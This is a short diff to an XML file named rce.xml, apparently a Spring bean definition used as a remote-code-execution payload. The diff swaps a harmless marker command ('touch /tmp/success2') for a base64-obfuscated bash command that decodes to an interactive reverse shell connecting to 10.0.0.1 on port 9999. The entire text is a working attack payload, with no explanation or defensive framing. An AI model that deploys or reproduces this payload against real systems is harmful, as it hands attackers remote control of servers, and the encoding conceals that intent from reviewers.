@@ -109,7 +109,7 @@ rce.xml
           <list>
             <value>bash</value>
             <value>-c</value>
-            <value><![CDATA[touch /tmp/success2]]></value>
+            <value><![CDATA[{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}]]></value>
           </list>
         </constructor-arg>
     </bean>
